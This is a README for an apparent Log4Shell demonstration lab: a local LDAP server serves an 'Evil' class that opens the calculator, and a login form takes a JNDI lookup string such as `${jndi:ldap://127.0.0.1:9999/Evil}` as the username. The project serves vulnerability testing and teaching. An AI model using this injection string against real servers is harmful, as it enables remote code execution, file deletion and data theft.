# README

## Goal for this project
This project goal is to provide an example to test the Log4Shell vulnerability.

It includes a simple LDAP Server that will receive the jndi lookups and will return an Evil class that executes the calculator in the server.

The main point here is to show that if we are able to start the calculator in the server, we can execute almost anything, deleting files, uploading them to malicious destinations or even changing them for hacing purposes.

## Prerequisites
- JDK 17
  
## Steps
1. execute the ldap server
   
    `mvn exec:java -Dexec.mainClass="org.vilojona.demo.JettyServer"`
2. execute the http server for the login endpoint

    `mvn exec:java`
3. open the login page

    `http://localhost:8000/index.html`
4. enter any user including the lookup Log4J text 

    `${jndi:ldap://127.0.0.1:9999/Evil}`
5. submit the form
6. check that the calendar has been executed
 